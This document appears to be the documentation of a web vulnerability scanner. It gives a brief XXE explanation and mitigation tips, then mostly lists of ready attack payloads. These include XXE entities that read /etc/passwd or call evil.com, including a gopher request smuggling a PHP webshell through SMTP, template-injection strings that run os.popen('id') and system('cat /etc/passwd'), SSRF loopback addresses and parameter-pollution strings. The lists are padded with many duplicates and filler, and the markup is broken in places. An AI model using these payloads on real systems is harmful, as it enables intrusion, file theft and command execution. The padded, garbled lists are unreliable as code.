<p>Imagine an application that takes an XML file as input to process some data. If the application is vulnerable to XXE, an attacker could send a malicious XML file with a reference to an external entity that points to a sensitive file on the server. The application, when parsing the XML, would then attempt to retrieve the contents of the specified file and potentially expose that data to the attacker.</p> 
<h1>Mitigation:</h1>
<p>To prevent XXE attacks, it's crucial to:</p>
<p></p>Disable external entity processing: Most XML parsers have options to disable the processing of external entities, which is the most effective way to prevent XXE. </p>
<p>Validate and sanitize XML input: Ensure that all XML input is validated against a well-defined schema and that any external entity references are properly handled or removed. </p>
<p></p>Use secure XML parsers: Employ XML parsers that are known to be secure and properly configured, and keep them updated with the latest security patches </p>


## XXE injection payloads(External Entity attack)
```

xxe_payloads = [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://evil.com/evil.dtd" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "data://text/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "expect://id" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "jar:file:///tmp/test.jar!/test.txt" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "netdoc:///etc/passwd" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "gopher://evil.com:25/_HELO%20evil.com%250d%250aMAIL%20FROM:%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%250d%250aRCPT%20TO:;%250d%250aDATA%250d%250aSubject:%20test%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "dict://evil.com:1337/" >]><foo>&xxe;</foo>'
        ]
        
        # Test parameters that commonly accept XML
        xml_params = ['xml', 'data', 'input', 'content', 'body', 'payload', 'request', 'xml_data', 'xml_content', 'xml_body', 'xml_payload', 'xml_request']
```

 ## Try POST request first
                   ```
                    response = self.session.post(target_url, data=test_data, headers=headers, timeout=10)
                    
                    # Check for XXE indicators
                    xxe_indicators = [
                        'root:x:0:0:', '[boot loader]', 'daemon:x:', 'bin:x:', 'sys:x:',
                        'xml error', 'xml parse error', 'entity reference', 'external entity',
                        'file://', 'http://', 'expect://', 'php://', 'jar://', 'netdoc://',
                        'gopher://', 'dict://', 'ftp://', 'ldap://', 'tftp://', 'telnet://'
                      
                    ]


      ```
## SSRF payloads

```
 ssrf_payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://0.0.0.0',
            'http://[::1]',
            'http://2130706433',
            'http://017700000001',
            'http://0x7f000001',
            'http://0177.0.0.1',
            'http://0x7f.0.0.1',
            'http://127.1',
            'http://127.0.1',
            'http://127.0.0.0',
            'http://127.0.0.2',
            'http://127.0.0.3',
            'http://127.0.0.4',
            'http://127.0.0.5',
            'http://127.0.0.6',
            'http://127.0.0.7',
            'http://127.0.0.8',
            'http://127.0.0.9',
            'http://127.0.0.10',
            'http://127.0.0.11',
            'http://127.0.0.12',
            'http://127.0.0.13',
            'http://127.0.0.14',
            'http://127.0.0.15',
            'http://127.0.0.16',
            'http://127.0.0.17',
            'http://127.0.0.18',
            'http://127.0.0.19',
            'http://127.0.0.20',
            'http://127.0.0.21',
            'http://127.0.0.22',
            'http://127.0.0.23',
            'http://127.0.0.24',
            'http://127.0.0.25',
            'http://127.0.0.26',
            'http://127.0.0.27',
            'http://127.0.0.28',
            'http://127.0.0.29',
            'http://127.0.0.30',
            'http://127.0.0.31',
            'http://127.0.0.32',
            'http://127.0.0.33',
            'http://127.0.0.34',
            'http://127.0.0.35',
            'http://127.0.0.36',
            'http://127.0.0.37',
            'http://127.0.0.38',
            'http://127.0.0.39',
            'http://127.0.0.40',
            'http://127.0.0.41',
            'http://127.0.0.42',
            'http://127.0.0.43',
            'http://127.0.0.44',
            'http://127.0.0.45',
            'http://127.0.0.46',
            'http://127.0.0.47',
            'http://127.0.0.48',
            'http://127.0.0.49',
            'http://127.0.0.50',
            'http://127.0.0.51',
            'http://127.0.0.52',
            'http://127.0.0.53',
            'http://127.0.0.54',
            'http://127.0.0.55',
            'http://127.0.0.56',
            'http://127.0.0.57',
            'http://127.0.0.58',
            'http://127.0.0.59',
            'http://127.0.0.60',
            'http://127.0.0.61',
            'http://127.0.0.62',
            'http://127.0.0.63',
            'http://127.0.0.64',
            'http://127.0.0.65',
            'http://127.0.0.66',
            'http://127.0.0.67',
            'http://127.0.0.68',
            'http://127.0.0.69',
            'http://127.0.0.70',
            'http://127.0.0.71',
            'http://127.0.0.72',
            'http://127.0.0.73',
            'http://127.0.0.74',
            'http://127.0.0.75',
            'http://127.0.0.76',
            'http://127.0.0.77',
            'http://127.0.0.78',
            'http://127.0.0.79',
            'http://127.0.0.80',
            'http://127.0.0.81',
            'http://127.0.0.82',
            'http://127.0.0.83',
            'http://127.0.0.84',
            'http://127.0.0.85',
            'http://127.0.0.86',
            'http://127.0.0.87',
            'http://127.0.0.88',
            'http://127.0.0.89',
            'http://127.0.0.90',
            'http://127.0.0.91',
            'http://127.0.0.92',
            'http://127.0.0.93',
            'http://127.0.0.94',
            'http://127.0.0.95',
            'http://127.0.0.96',
            'http://127.0.0.97',
            'http://127.0.0.98',
            'http://127.0.0.99',
            'http://127.0.0.100',
            'http://127.0.0.101',
            'http://127.0.0.102',
            'http://127.0.0.103',
            'http://127.0.0.104',
            'http://127.0.0.105',
            'http://127.0.0.106',
            'http://127.0.0.107',
            'http://127.0.0.108',
            'http://127.0.0.109',
            'http://127.0.0.110',
            'http://127.0.0.111',
            'http://127.0.0.112',
            'http://127.0.0.113',
            'http://127.0.0.114',
            'http://127.0.0.115',
            'http://127.0.0.116',
            'http://127.0.0.117',
            'http://127.0.0.118',
            'http://127.0.0.119',
            'http://127.0.0.120',
            'http://127.0.0.121',
            'http://127.0.0.122',
            'http://127.0.0.123',
            'http://127.0.0.124',
            'http://127.0.0.125',
            'http://127.0.0.126',
            'http://127.0.0.127',
            'http://127.0.0.128',
            'http://127.0.0.129',
            'http://127.0.0.130',
            'http://127.0.0.131',
            'http://127.0.0.132',
            'http://127.0.0.133',
            'http://127.0.0.134',
            'http://127.0.0.135',
            'http://127.0.0.136',
            'http://127.0.0.137',
            'http://127.0.0.138',
            'http://127.0.0.139',
            'http://127.0.0.140',
            'http://127.0.0.141',
            'http://127.0.0.142',
            'http://127.0.0.143',
            'http://127.0.0.144',
            'http://127.0.0.145',
            'http://127.0.0.146',
            'http://127.0.0.147',
            'http://127.0.0.148',
            'http://127.0.0.149',
            'http://127.0.0.150',
            'http://127.0.0.151',
            'http://127.0.0.152',
            'http://127.0.0.153',
            'http://127.0.0.154',
            'http://127.0.0.155',
            'http://127.0.0.156',
            'http://127.0.0.157',
            'http://127.0.0.158',
            'http://127.0.0.159',
            'http://127.0.0.160',
            'http://127.0.0.161',
            'http://127.0.0.162',
            'http://127.0.0.163',
            'http://127.0.0.164',
            'http://127.0.0.165',
            'http://127.0.0.166',
            'http://127.0.0.167',
            'http://127.0.0.168',
            'http://127.0.0.169',
            'http://127.0.0.170',
            'http://127.0.0.171',
            'http://127.0.0.172',
            'http://127.0.0.173',
            'http://127.0.0.174',
            'http://127.0.0.175',
            'http://127.0.0.176',
            'http://127.0.0.177',
            'http://127.0.0.178',
            'http://127.0.0.179',
            'http://127.0.0.180',
            'http://127.0.0.181',
            'http://127.0.0.182',
            'http://127.0.0.183',
            'http://127.0.0.184',
            'http://127.0.0.185',
            'http://127.0.0.186',
            'http://127.0.0.187',
            'http://127.0.0.188',
            'http://127.0.0.189',
            'http://127.0.0.190',
            'http://127.0.0.191',
            'http://127.0.0.192',
            'http://127.0.0.193',
            'http://127.0.0.194',
            'http://127.0.0.195',
            'http://127.0.0.196',
            'http://127.0.0.197',
            'http://127.0.0.198',
            'http://127.0.0.199',
            'http://127.0.0.200',
            'http://127.0.0.201',
            'http://127.0.0.202',
            'http://127.0.0.203',
            'http://127.0.0.204',
            'http://127.0.0.205',
            'http://127.0.0.206',
            'http://127.0.0.207',
            'http://127.0.0.208',
            'http://127.0.0.209',
            'http://127.0.0.210',
            'http://127.0.0.211',
            'http://127.0.0.212',
            'http://127.0.0.213',
            'http://127.0.0.214',
            'http://127.0.0.215',
            'http://127.0.0.216',
            'http://127.0.0.217',
            'http://127.0.0.218',
            'http://127.0.0.219',
            'http://127.0.0.220',
            'http://127.0.0.221',
            'http://127.0.0.222',
            'http://127.0.0.223',
            'http://127.0.0.224',
            'http://127.0.0.225',
            'http://127.0.0.226',
            'http://127.0.0.227',
            'http://127.0.0.228',
            'http://127.0.0.229',
            'http://127.0.0.230',
            'http://127.0.0.231',
            'http://127.0.0.232',
            'http://127.0.0.233',
            'http://127.0.0.234',
            'http://127.0.0.235',
            'http://127.0.0.236',
            'http://127.0.0.237',
            'http://127.0.0.238',
            'http://127.0.0.239',
            'http://127.0.0.240',
            'http://127.0.0.241',
            'http://127.0.0.242',
            'http://127.0.0.243',
            'http://127.0.0.244',
            'http://127.0.0.245',
            'http://127.0.0.246',
            'http://127.0.0.247',
            'http://127.0.0.248',
            'http://127.0.0.249',
            'http://127.0.0.250',
            'http://127.0.0.251',
            'http://127.0.0.252',
            'http://127.0.0.253',
            'http://127.0.0.254',
            'http://127.0.0.255'
        ]
```

# Template injection payloads

```
 template_payloads = [
            # Basic template injection
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            
            # Jinja2/Python templates
            '{{config}}',
            '{{config.items()}}',
            '{{config.values()}}',
            '{{config.keys()}}',
            '{{config.__class__}}',
            '{{config.__class__.__init__}}',
            '{{config.__class__.__init__.__globals__}}',
            '{{config.__class__.__init__.__globals__[\'os\']}}',
            '{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}',
            '{{config.__class__.__init__.__globals__[\'os\'].popen(\'whoami\').read()}}',
            
            # ERB/Ruby templates
            '<%= 7*7 %>',
            '<%= Dir.entries("/") %>',
            '<%= File.read("/etc/passwd") %>',
            '<%= system("id") %>',
            '<%= system("whoami") %>',
            '<%= system("ls -la") %>',
            '<%= system("pwd") %>',
            '<%= system("hostname") %>',
            '<%= system("uname -a") %>',
            '<%= system("cat /etc/passwd") %>',
            
            # PHP templates
            '<?php echo 7*7; ?>',
            '<?php system("id"); ?>',
            '<?php system("whoami"); ?>',
            '<?php system("ls -la"); ?>',
            '<?php system("pwd"); ?>',
            '<?php system("hostname"); ?>',
            '<?php system("uname -a"); ?>',
            '<?php system("cat /etc/passwd"); ?>',
            '<?php echo file_get_contents("/etc/passwd"); ?>',
            '<?php echo file_get_contents("/etc/hostname"); ?>',
            
            # Freemarker templates
            '${7*7}',
            '${7*7}',
            '${7*7}',
            '${7*7}',
            '${7*7}',
            '${7*7}',
            '${7*7}',
            '${7*7}',
            '${7*7}',
            '${7*7}',
            
            # Velocity templates
            '#set($x=7*7)${x}',
            '#set($x=7*7)${x}',
            '#set($x=7*7)${x}',
            '#set($x=7*7)${x}',
            '#set($x=7*7)${x}',
            '#set($x=7*7)${x}',
            '#set($x=7*7)${x}',
            '#set($x=7*7)${x}',
            '#set($x=7*7)${x}',
            '#set($x=7*7)${x}',
            
            # Thymeleaf templates
            '${7*7}',
            '${7*7}',
            '${7*7}',
            '${7*7}',
            '${7*7}',
            '${7*7}',
            '${7*7}',
            '${7*7}',
            '${7*7}',
            '${7*7}',
            
            # Handlebars templates
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            
            # Mustache templates
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            
            # EJS templates
            '<%= 7*7 %>',
            '<%= 7*7 %>',
            '<%= 7*7 %>',
            '<%= 7*7 %>',
            '<%= 7*7 %>',
            '<%= 7*7 %>',
            '<%= 7*7 %>',
            '<%= 7*7 %>',
            '<%= 7*7 %>',
            '<%= 7*7 %>',
            
            # Pug templates
            '= 7*7',
            '= 7*7',
            '= 7*7',
            '= 7*7',
            '= 7*7',
            '= 7*7',
            '= 7*7',
            '= 7*7',
            '= 7*7',
            '= 7*7',
            
            # Nunjucks templates
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}',
            '{{7*7}}'
        ]
        
        # Test parameters that commonly accept template content
        template_params = ['template', 'view', 'page', 'content', 'body', 'text', 'html', 'render', 'display', 'show', 'format', 'style', 'theme', 'layout', 'design', 'skin', 'appearance', 'look', 'feel', 'presentation', 'output', 'result', 'generated', 'dynamic', 'static', 'custom', 'user', 'profile', 'dashboard', 'panel', 'control', 'admin', 'moderator', 'editor', 'author', 'contributor', 'member', 'guest', 'visitor', 'anonymous', 'public', 'private', 'secret', 'hidden', 'visible', 'shown', 'displayed', 'rendered', 'generated', 'created', 'built', 'constructed', 'assembled', 'composed', 'formed', 'made', 'produced', 'developed', 'written', 'coded', 'programmed', 'scripted', 'automated', 'manual', 'automatic', 'dynamic', 'static', 'real-time', 'live', 'interactive', 'responsive', 'adaptive', 'flexible', 'scalable', 'modular', 'component-based', 'object-oriented', 'functional', 'procedural', 'declarative', 'imperative', 'event-driven', 'message-driven', 'service-oriented', 'microservices', 'monolithic', 'distributed', 'centralized', 'decentralized', 'peer-to-peer', 'client-server', 'three-tier', 'n-tier', 'layered', 'tiered']
```


 # Check for template injection indicators

 ```
 template_indicators = [
                        '49', '7*7', 'config', 'Dir.entries', 'File.read', 'system(',
                        'echo', 'popen', 'read()', 'entries', 'read', 'system',
                        'os.', '__class__', '__init__', '__globals__', 'popen',
                        'id', 'whoami', 'ls', 'pwd', 'hostname', 'uname', 'cat',
                        'passwd', 'hostname', 'config.items', 'config.values',
                        'config.keys', 'config.__class__', 'config.__init__',
                        'config.__globals__', 'config.os', 'config.popen',
                        'config.read', 'config.entries', 'config.system',
                        'config.echo', 'config.id', 'config.whoami', 'config.ls',
                        'config.pwd', 'config.hostname', 'config.uname', 'config.cat',
                        'config.passwd', 'config.hostname', 'config.items',
                        'config.values', 'config.keys', 'config.__class__',
                        'config.__init__', 'config.__globals__', 'config.os',
                        'config.popen', 'config.read', 'config.entries',
                        'config.system', 'config.echo', 'config.id', 'config.whoami',
                        'config.ls', 'config.pwd', 'config.hostname', 'config.uname',
                        'config.cat', 'config.passwd', 'config.hostname'
                    ]
```
## Check for HTTP Parameter Pollution vulnerabilities

```
# HPP payloads
        hpp_payloads = [
            # Duplicate parameters
            'id=1&id=2',
            'user=admin&user=guest',
            'search=test&search=admin',
            'q=hello&q=world',
            'page=1&page=2',
            'sort=asc&sort=desc',
            'filter=active&filter=inactive',
            'status=open&status=closed',
            'type=public&type=private',
            'category=news&category=sports',
            
            # Array parameters
            'id[]=1&id[]=2',
            'user[]=admin&user[]=guest',
            'search[]=test&search[]=admin',
            'q[]=hello&q[]=world',
            'page[]=1&page[]=2',
            'sort[]=asc&sort[]=desc',
            'filter[]=active&filter[]=inactive',
            'status[]=open&status[]=closed',
            'type[]=public&type[]=private',
            'category[]=news&category[]=sports',
            
            # Mixed parameters
            'id=1&id[]=2',
            'user=admin&user[]=guest',
            'search=test&search[]=admin',
            'q=hello&q[]=world',
            'page=1&page[]=2',
            'sort=asc&sort[]=desc',
            'filter=active&filter[]=inactive',
            'status=open&status[]=closed',
            'type=public&type[]=private',
            'category=news&category[]=sports'
        ]
        
        # Test parameters that commonly accept multiple values
        hpp_params = ['id', 'user', 'search', 'q', 'page', 'sort', 'filter', 'status', 'type', 'category', 'tag', 'label', 'group', 'role', 'permission', 'access', 'level', 'priority', 'severity', 'risk', 'threat', 'vulnerability', 'exploit', 'attack', 'payload', 'vector', 'method', 'technique', 'tactic', 'procedure', 'step', 'action', 'operation', 'function', 'feature', 'option', 'setting', 'config', 'configuration', 'parameter', 'argument', 'input', 'output', 'result', 'response', 'request', 'data', 'content', 'body', 'header', 'cookie', 'session', 'token', 'key', 'secret', 'password', 'credential', 'authentication', 'authorization', 'identity', 'profile', 'account', 'user', 'admin', 'moderator', 'editor', 'author', 'contributor', 'member', 'guest', 'visitor', 'anonymous', 'public', 'private', 'secret', 'hidden', 'visible', 'shown', 'displayed', 'rendered', 'generated', 'created', 'built', 'constructed', 'assembled', 'composed', 'formed', 'made', 'produced', 'developed', 'written', 'coded', 'programmed', 'scripted', 'automated', 'manual', 'automatic', 'dynamic', 'static', 'real-time', 'live', 'interactive', 'responsive', 'adaptive', 'flexible', 'scalable', 'modular', 'component-based', 'object-oriented', 'functional', 'procedural', 'declarative', 'imperative', 'event-driven', 'message-driven', 'service-oriented', 'microservices', 'monolithic', 'distributed', 'centralized', 'decentralized', 'peer-to-peer', 'client-server', 'three-tier', 'n-tier', 'layered', 'tiered']
```
### Project Structure

```
Cyber-Wolf-Hunter/
├── cyber_wolf_hunter/
│   ├── __init__.py          # Main package interface
│   ├── core.py              # Core WolfHunter class
│   ├── scanners.py          # Vulnerability scanner methods
│   ├── reporter.py          # HTML report generation
│   └── templates/           # HTML report templates
├── examples/                 # Usage examples
├── tests/                   # Test suite
├── docs/                    # Documentation
└── setup.py                 # Package configuration
```
